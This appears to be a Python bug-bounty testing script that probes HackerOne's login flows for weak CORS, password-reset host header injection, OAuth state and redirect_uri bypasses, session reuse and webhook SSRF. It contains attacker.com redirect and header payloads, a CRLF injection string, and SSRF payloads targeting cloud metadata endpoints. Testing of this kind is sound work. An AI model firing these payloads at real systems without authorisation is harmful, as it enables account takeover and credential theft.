#!/usr/bin/env python3
"""
HackerOne OAuth / Auth Flow Tester
Tests: OAuth state CSRF, redirect_uri bypass, 2FA bypass, pre-account-takeover,
password reset host header injection.

Usage:
  python3 h1_oauth_tester.py --email your@email.com
  python3 h1_oauth_tester.py --check-cors
  python3 h1_oauth_tester.py --check-reset --email your@email.com
"""

import argparse
import json
import time
import urllib.request
import urllib.error
import urllib.parse

BASE = "https://hackerone.com"

def request(method: str, path: str, headers: dict = None, data: dict = None,
            extra_headers: dict = None) -> tuple[int, str, dict]:
    url = f"{BASE}{path}" if path.startswith("/") else path
    body = json.dumps(data).encode() if data else None
    h = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Accept": "application/json, text/html",
        "Content-Type": "application/json",
    }
    if headers:
        h.update(headers)
    if extra_headers:
        h.update(extra_headers)

    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            resp_headers = dict(r.headers)
            body_text = r.read().decode(errors="replace")
            return r.status, body_text, resp_headers
    except urllib.error.HTTPError as e:
        resp_headers = dict(e.headers) if e.headers else {}
        body_text = e.read().decode(errors="replace")
        return e.code, body_text, resp_headers
    except Exception as e:
        return 0, str(e), {}


# ─── Tests ────────────────────────────────────────────────────────────────────

def check_cors():
    """Check CORS on key H1 endpoints."""
    print("\n[CORS Check]")
    endpoints = [
        "/graphql",
        "/api/v1/reports",
        "/users/sign_in",
        "/users/password",
    ]
    for path in endpoints:
        status, _, resp_headers = request("GET", path, extra_headers={
            "Origin": "https://attacker.com",
        })
        acao = resp_headers.get("Access-Control-Allow-Origin", resp_headers.get("access-control-allow-origin", "NOT SET"))
        acac = resp_headers.get("Access-Control-Allow-Credentials", resp_headers.get("access-control-allow-credentials", "NOT SET"))
        vuln = acao in ["*", "https://attacker.com", "null"]
        marker = "[VULN]" if vuln else "[OK]  "
        print(f"  {marker} {path}")
        print(f"         ACAO: {acao}  |  ACAC: {acac}")
        time.sleep(0.3)


def check_password_reset_host_header(email: str):
    """Test if Host header injection affects password reset links."""
    print(f"\n[Password Reset Host Header Injection]")
    print(f"  Email: {email}")
    print("  Sending 4 variations — check your inbox for reset link domain\n")

    tests = [
        ("Normal (baseline)", {}),
        ("X-Forwarded-Host: attacker.com", {"X-Forwarded-Host": "attacker.com"}),
        ("X-Host: attacker.com", {"X-Host": "attacker.com"}),
        ("Host override", {"Host": "attacker.com"}),
    ]

    for name, extra_headers in tests:
        status, body, _ = request(
            "POST", "/users/password",
            data={"user": {"email": email}},
            extra_headers=extra_headers,
        )
        print(f"  [{name}] HTTP {status}")
        time.sleep(1)

    print("\n  CHECK YOUR EMAIL: Does the reset link use 'attacker.com'?")
    print("  If yes → Host Header Injection = HIGH severity finding")


def check_oauth_state_entropy():
    """Fetch the GitHub OAuth URL and check state parameter entropy."""
    print("\n[OAuth State Entropy Check]")

    states = []
    for i in range(3):
        # GET the OAuth initiation endpoint
        status, body, headers = request("GET", "/auth/github")
        location = headers.get("Location", headers.get("location", ""))
        if "state=" in location:
            state = urllib.parse.parse_qs(urllib.parse.urlparse(location).query).get("state", [""])[0]
            states.append(state)
            print(f"  State {i+1}: {state}")
        else:
            print(f"  Could not extract state from: {location[:100]}")
        time.sleep(0.5)

    if states:
        lengths = [len(s) for s in states]
        all_unique = len(set(states)) == len(states)
        print(f"\n  Lengths: {lengths}")
        print(f"  All unique: {all_unique}")
        if not all_unique:
            print("  [VULN] State parameters are reused! CSRF possible.")
        elif min(lengths) < 16:
            print("  [WEAK] State parameter too short — may be predictable")
        else:
            print("  [OK] State appears properly random")


def check_redirect_uri_bypass():
    """Test redirect_uri manipulation in GitHub OAuth flow."""
    print("\n[OAuth redirect_uri Bypass]")
    print("  Testing redirect_uri manipulation vectors")

    # Get the legit OAuth redirect URI from H1's OAuth flow
    status, body, headers = request("GET", "/auth/github")
    location = headers.get("Location", headers.get("location", ""))

    if not location or "github.com" not in location:
        print(f"  Could not get OAuth redirect — got: {location[:80]}")
        print("  Try this manually in browser with Burp intercepting")
        return

    parsed = urllib.parse.urlparse(location)
    params = urllib.parse.parse_qs(parsed.query)
    legit_redirect = params.get("redirect_uri", [""])[0]
    client_id = params.get("client_id", [""])[0]
    state = params.get("state", [""])[0]

    print(f"  Legit redirect_uri: {legit_redirect}")
    print(f"  Client ID: {client_id}")
    print()

    bypasses = [
        legit_redirect.replace("hackerone.com", "hackerone.com.attacker.com"),
        legit_redirect + "@attacker.com",
        legit_redirect.replace("hackerone.com", "hackerone.com%2F@attacker.com"),
        "https://attacker.com/",
        legit_redirect + "%0d%0aLocation: https://attacker.com",
    ]

    for bypass in bypasses:
        bypass_params = urllib.parse.urlencode({
            "client_id": client_id,
            "redirect_uri": bypass,
            "scope": "user:email",
            "state": state,
        })
        test_url = f"https://github.com/login/oauth/authorize?{bypass_params}"
        print(f"  Test URI: {bypass[:70]}")
        # We can't follow this without a browser session, so just print for manual testing
        print(f"  → Open in browser (intercepted): {test_url[:100]}")
        print()

    print("  INSTRUCTIONS:")
    print("  1. Copy each test URL above")
    print("  2. Open in browser with Burp intercepting")
    print("  3. Check if GitHub accepts the modified redirect_uri")
    print("  4. If GitHub redirects code to attacker.com → token theft → ATO")


def check_token_reuse(token_a: str):
    """Check if H1 session tokens can be reused after logout."""
    print("\n[Session Token Reuse After Logout]")

    # Test if the token still works before logout
    status, body, _ = request("GET", "/graphql",
                               headers={"Authorization": f"Bearer {token_a}"},
                               data={"query": "{ me { id } }"})
    print(f"  Pre-logout token test: HTTP {status}")

    print("  NOTE: Log out manually in browser, then run:")
    print(f"  curl -H 'Authorization: Bearer {token_a}' https://hackerone.com/graphql \\")
    print(f"       -d '{{\"query\":\"{{me{{id}}}}\"}}' -H 'Content-Type: application/json'")
    print("  If this returns your user ID after logout → session token not invalidated")


def check_ssrf_webhook():
    """Print SSRF webhook test instructions and validate interactsh is reachable."""
    print("\n[SSRF via Integration Webhooks]")
    print("""
  STEPS (requires sandbox program as program manager):

  1. Start interactsh listener:
     interactsh-client -s

  2. Copy your interaction URL (e.g. xxxx.oast.pro)

  3. Go to: https://hackerone.com/{your_sandbox_program}/edit_webhook_integrations
     OR: Settings → Integrations → Slack → Add webhook

  4. Set webhook URL to each payload below and trigger a test event:

  PAYLOADS (paste as webhook URL):
     http://xxxx.oast.pro/baseline                     ← confirm server makes request
     http://169.254.169.254/latest/meta-data/           ← AWS IMDSv1
     http://0x7f000001/                                 ← 127.0.0.1 hex
     http://2130706433/                                 ← 127.0.0.1 decimal
     http://[::1]/                                      ← IPv6 loopback
     http://[::ffff:127.0.0.1]/                         ← IPv4-mapped IPv6
     http://127.1/                                      ← shorthand
     http://100.100.100.200/latest/meta-data/           ← Alibaba Cloud

  5. If direct IPs blocked, try redirect chain:
     Set webhook to: https://xxxx.oast.pro/redirect
     Configure your interactsh/server to return:
       HTTP/1.1 301 Moved Permanently
       Location: http://169.254.169.254/latest/meta-data/

  6. Check interactsh for any callbacks — content in callback = SSRF confirmed

  If AWS metadata returns credentials → CRITICAL finding
  If you just get a callback = SSRF (MEDIUM/HIGH depending on internal access)
""")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="HackerOne Auth/OAuth Tester")
    parser.add_argument("--email", help="Your test account email (for password reset tests)")
    parser.add_argument("--token-a", help="Account A Bearer token")
    parser.add_argument("--check-cors", action="store_true", help="Check CORS on H1 endpoints")
    parser.add_argument("--check-reset", action="store_true", help="Test password reset host header injection")
    parser.add_argument("--check-oauth", action="store_true", help="Test OAuth state entropy + redirect_uri bypass")
    parser.add_argument("--check-ssrf", action="store_true", help="Print SSRF webhook test instructions")
    parser.add_argument("--all", action="store_true", help="Run all checks")
    args = parser.parse_args()

    run_all = args.all

    if run_all or args.check_cors:
        check_cors()

    if (run_all or args.check_reset) and args.email:
        check_password_reset_host_header(args.email)

    if run_all or args.check_oauth:
        check_oauth_state_entropy()
        check_redirect_uri_bypass()

    if (run_all or args.token_a) and args.token_a:
        check_token_reuse(args.token_a)

    if run_all or args.check_ssrf:
        check_ssrf_webhook()

    if not any([args.check_cors, args.check_reset, args.check_oauth,
                args.check_ssrf, args.token_a, args.all]):
        parser.print_help()


if __name__ == "__main__":
    main()
